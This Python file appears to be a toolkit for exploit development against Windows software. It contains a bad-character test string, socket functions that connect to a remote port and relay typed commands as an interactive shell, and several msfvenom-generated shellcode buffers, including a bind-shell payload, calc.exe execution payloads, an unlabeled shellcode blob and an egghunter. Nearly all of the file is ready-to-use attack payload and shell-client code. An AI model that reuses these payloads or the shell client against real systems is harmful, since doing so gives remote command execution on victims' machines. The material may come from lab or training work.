import socket
import threading
import time

badchar=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
         ).encode()


def rl(ip,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    def recv_loop(sock):
        while True:
            try:
                data = sock.recv(4096)
                if data:
                    print(data.decode("gbk", errors="ignore"), end="")
                else:
                    time.sleep(0.05)
            except:
                time.sleep(0.05)

    t = threading.Thread(target=recv_loop, args=(sock,))
    t.daemon = True
    t.start()

def interactive_shell(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))

    def recv_loop(sock):
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    print("\n[!] Connection closed by remote")
                    break
                print(data.decode("gbk", errors="ignore"), end="", flush=True)
            except:
                time.sleep(0.05)

    t = threading.Thread(target=recv_loop, args=(sock,))
    t.daemon = True
    t.start()

    try:
        while True:
            cmd = input()
            if cmd.strip().lower() in ("exit", "quit"):
                break
            sock.sendall((cmd + "\n").encode("gbk", errors="ignore"))
    except (KeyboardInterrupt, EOFError):
        pass
    finally:
        sock.close()
        print("\n[*] Shell closed")


shellcode =  b""
shellcode += b"\xdb\xdc\xba\xcf\x4f\x98\xf7\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x53\x83\xc7\x04\x31\x57\x13"
shellcode += b"\x03\x98\x5c\x7a\x02\xda\x8b\xf8\xed\x22\x4c"
shellcode += b"\x9d\x64\xc7\x7d\x9d\x13\x8c\x2e\x2d\x57\xc0"
shellcode += b"\xc2\xc6\x35\xf0\x51\xaa\x91\xf7\xd2\x01\xc4"
shellcode += b"\x36\xe2\x3a\x34\x59\x60\x41\x69\xb9\x59\x8a"
shellcode += b"\x7c\xb8\x9e\xf7\x8d\xe8\x77\x73\x23\x1c\xf3"
shellcode += b"\xc9\xf8\x97\x4f\xdf\x78\x44\x07\xde\xa9\xdb"
shellcode += b"\x13\xb9\x69\xda\xf0\xb1\x23\xc4\x15\xff\xfa"
shellcode += b"\x7f\xed\x8b\xfc\xa9\x3f\x73\x52\x94\x8f\x86"
shellcode += b"\xaa\xd1\x28\x79\xd9\x2b\x4b\x04\xda\xe8\x31"
shellcode += b"\xd2\x6f\xea\x92\x91\xc8\xd6\x23\x75\x8e\x9d"
shellcode += b"\x28\x32\xc4\xf9\x2c\xc5\x09\x72\x48\x4e\xac"
shellcode += b"\x54\xd8\x14\x8b\x70\x80\xcf\xb2\x21\x6c\xa1"
shellcode += b"\xcb\x31\xcf\x1e\x6e\x3a\xe2\x4b\x03\x61\x6b"
shellcode += b"\xbf\x2e\x99\x6b\xd7\x39\xea\x59\x78\x92\x64"
shellcode += b"\xd2\xf1\x3c\x73\x15\x28\xf8\xeb\xe8\xd3\xf9"
shellcode += b"\x22\x2f\x87\xa9\x5c\x86\xa8\x21\x9c\x27\x7d"
shellcode += b"\xdf\x94\x8e\x2e\xc2\x59\x70\x9f\x42\xf1\x19"
shellcode += b"\xf5\x4c\x2e\x39\xf6\x86\x47\xd2\x0b\x29\x76"
shellcode += b"\x7f\x85\xcf\x12\x6f\xc3\x58\x8a\x4d\x30\x51"
shellcode += b"\x2d\xad\x12\xc9\xd9\xe6\x74\xce\xe6\xf6\x52"
shellcode += b"\x78\x70\x7d\xb1\xbc\x61\x82\x9c\x94\xf6\x15"
shellcode += b"\x6a\x75\xb5\x84\x6b\x5c\x2d\x24\xf9\x3b\xad"
shellcode += b"\x23\xe2\x93\xfa\x64\xd4\xed\x6e\x99\x4f\x44"
shellcode += b"\x8c\x60\x09\xaf\x14\xbf\xea\x2e\x95\x32\x56"
shellcode += b"\x15\x85\x8a\x57\x11\xf1\x42\x0e\xcf\xaf\x24"
shellcode += b"\xf8\xa1\x19\xff\x57\x68\xcd\x86\x9b\xab\x8b"
shellcode += b"\x86\xf1\x5d\x73\x36\xac\x1b\x8c\xf7\x38\xac"
shellcode += b"\xf5\xe5\xd8\x53\x2c\xae\xf9\xb1\xe4\xdb\x91"
shellcode += b"\x6f\x6d\x66\xfc\x8f\x58\xa5\xf9\x13\x68\x56"
shellcode += b"\xfe\x0c\x19\x53\xba\x8a\xf2\x29\xd3\x7e\xf4"
shellcode += b"\x9e\xd4\xaa"
shellcode1=shellcode

#msfvenom -p windows/shell_bind_tcp EXITfunc=thread -b "\x00" -f python
buf =  b""
buf += b"\xbf\x82\x53\x25\x11\xda\xd9\xd9\x74\x24\xf4\x5d"
buf += b"\x29\xc9\xb1\x53\x31\x7d\x12\x03\x7d\x12\x83\x6f"
buf += b"\xaf\xc7\xe4\x93\xb8\x8a\x07\x6b\x39\xeb\x8e\x8e"
buf += b"\x08\x2b\xf4\xdb\x3b\x9b\x7e\x89\xb7\x50\xd2\x39"
buf += b"\x43\x14\xfb\x4e\xe4\x93\xdd\x61\xf5\x88\x1e\xe0"
buf += b"\x75\xd3\x72\xc2\x44\x1c\x87\x03\x80\x41\x6a\x51"
buf += b"\x59\x0d\xd9\x45\xee\x5b\xe2\xee\xbc\x4a\x62\x13"
buf += b"\x74\x6c\x43\x82\x0e\x37\x43\x25\xc2\x43\xca\x3d"
buf += b"\x07\x69\x84\xb6\xf3\x05\x17\x1e\xca\xe6\xb4\x5f"
buf += b"\xe2\x14\xc4\x98\xc5\xc6\xb3\xd0\x35\x7a\xc4\x27"
buf += b"\x47\xa0\x41\xb3\xef\x23\xf1\x1f\x11\xe7\x64\xd4"
buf += b"\x1d\x4c\xe2\xb2\x01\x53\x27\xc9\x3e\xd8\xc6\x1d"
buf += b"\xb7\x9a\xec\xb9\x93\x79\x8c\x98\x79\x2f\xb1\xfa"
buf += b"\x21\x90\x17\x71\xcf\xc5\x25\xd8\x98\x2a\x04\xe2"
buf += b"\x58\x25\x1f\x91\x6a\xea\x8b\x3d\xc7\x63\x12\xba"
buf += b"\x28\x5e\xe2\x54\xd7\x61\x13\x7d\x1c\x35\x43\x15"
buf += b"\xb5\x36\x08\xe5\x3a\xe3\xa5\xed\x9d\x5c\xd8\x10"
buf += b"\x5d\x0d\x5c\xba\x36\x47\x53\xe5\x27\x68\xb9\x8e"
buf += b"\xc0\x95\x42\xa1\x4c\x13\xa4\xab\x7c\x75\x7e\x43"
buf += b"\xbf\xa2\xb7\xf4\xc0\x80\xef\x92\x89\xc2\x28\x9d"
buf += b"\x09\xc1\x1e\x09\x82\x06\x9b\x28\x95\x02\x8b\x3d"
buf += b"\x02\xd8\x5a\x0c\xb2\xdd\x76\xe6\x57\x4f\x1d\xf6"
buf += b"\x1e\x6c\x8a\xa1\x77\x42\xc3\x27\x6a\xfd\x7d\x55"
buf += b"\x77\x9b\x46\xdd\xac\x58\x48\xdc\x21\xe4\x6e\xce"
buf += b"\xff\xe5\x2a\xba\xaf\xb3\xe4\x14\x16\x6a\x47\xce"
buf += b"\xc0\xc1\x01\x86\x95\x29\x92\xd0\x99\x67\x64\x3c"
buf += b"\x2b\xde\x31\x43\x84\xb6\xb5\x3c\xf8\x26\x39\x97"
buf += b"\xb8\x47\xd8\x3d\xb5\xef\x45\xd4\x74\x72\x76\x03"
buf += b"\xba\x8b\xf5\xa1\x43\x68\xe5\xc0\x46\x34\xa1\x39"
buf += b"\x3b\x25\x44\x3d\xe8\x46\x4d"
shellcode2=buf

#
buf =  b""
buf += b"\xda\xc1\xb8\xa5\x1b\x95\xd0\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x31\x83\xc3\x04\x31\x43\x14\x03\x43"
buf += b"\xb1\xf9\x60\x2c\x51\x7f\x8a\xcd\xa1\xe0\x02\x28"
buf += b"\x90\x20\x70\x38\x82\x90\xf2\x6c\x2e\x5a\x56\x85"
buf += b"\xa5\x2e\x7f\xaa\x0e\x84\x59\x85\x8f\xb5\x9a\x84"
buf += b"\x13\xc4\xce\x66\x2a\x07\x03\x66\x6b\x7a\xee\x3a"
buf += b"\x24\xf0\x5d\xab\x41\x4c\x5e\x40\x19\x40\xe6\xb5"
buf += b"\xe9\x63\xc7\x6b\x62\x3a\xc7\x8a\xa7\x36\x4e\x95"
buf += b"\xa4\x73\x18\x2e\x1e\x0f\x9b\xe6\x6f\xf0\x30\xc7"
buf += b"\x40\x03\x48\x0f\x66\xfc\x3f\x79\x95\x81\x47\xbe"
buf += b"\xe4\x5d\xcd\x25\x4e\x15\x75\x82\x6f\xfa\xe0\x41"
buf += b"\x63\xb7\x67\x0d\x67\x46\xab\x25\x93\xc3\x4a\xea"
buf += b"\x12\x97\x68\x2e\x7f\x43\x10\x77\x25\x22\x2d\x67"
buf += b"\x86\x9b\x8b\xe3\x2a\xcf\xa1\xa9\x20\x0e\x37\xd4"
buf += b"\x06\x10\x47\xd7\x36\x79\x76\x5c\xd9\xfe\x87\xb7"
buf += b"\x9e\xf1\xcd\x9a\xb6\x99\x8b\x4e\x8b\xc7\x2b\xa5"
buf += b"\xcf\xf1\xaf\x4c\xaf\x05\xaf\x24\xaa\x42\x77\xd4"
buf += b"\xc6\xdb\x12\xda\x75\xdb\x36\xb9\x18\x4f\xda\x10"
buf += b"\xbf\xf7\x79\x6d"

shellcode_calc=buf


#msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python
buf =  b""
buf += b"\xdb\xdb\xbf\x19\x7f\x7b\x47\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x31\x31\x7a\x18\x03\x7a\x18\x83\xea"
buf += b"\xe5\x9d\x8e\xbb\xfd\xe0\x71\x44\xfd\x84\xf8\xa1"
buf += b"\xcc\x84\x9f\xa2\x7e\x35\xeb\xe7\x72\xbe\xb9\x13"
buf += b"\x01\xb2\x15\x13\xa2\x79\x40\x1a\x33\xd1\xb0\x3d"
buf += b"\xb7\x28\xe5\x9d\x86\xe2\xf8\xdc\xcf\x1f\xf0\x8d"
buf += b"\x98\x54\xa7\x21\xad\x21\x74\xc9\xfd\xa4\xfc\x2e"
buf += b"\xb5\xc7\x2d\xe1\xce\x91\xed\x03\x03\xaa\xa7\x1b"
buf += b"\x40\x97\x7e\x97\xb2\x63\x81\x71\x8b\x8c\x2e\xbc"
buf += b"\x24\x7f\x2e\xf8\x82\x60\x45\xf0\xf1\x1d\x5e\xc7"
buf += b"\x88\xf9\xeb\xdc\x2a\x89\x4c\x39\xcb\x5e\x0a\xca"
buf += b"\xc7\x2b\x58\x94\xcb\xaa\x8d\xae\xf7\x27\x30\x61"
buf += b"\x7e\x73\x17\xa5\xdb\x27\x36\xfc\x81\x86\x47\x1e"
buf += b"\x6a\x76\xe2\x54\x86\x63\x9f\x36\xcc\x72\x2d\x4d"
buf += b"\xa2\x75\x2d\x4e\x92\x1d\x1c\xc5\x7d\x59\xa1\x0c"
buf += b"\x3a\x95\xeb\x0d\x6a\x3e\xb2\xc7\x2f\x23\x45\x32"
buf += b"\x73\x5a\xc6\xb7\x0b\x99\xd6\xbd\x0e\xe5\x50\x2d"
buf += b"\x62\x76\x35\x51\xd1\x77\x1c\x32\xb4\xeb\xfc\x9b"
buf += b"\x53\x8c\x67\xe4"

shellcode_calc2=buf


#msf-egghunter -p windows -f python -b "\x00" -e hack -v egghunter
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b"
egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

egghunter_1=egghunter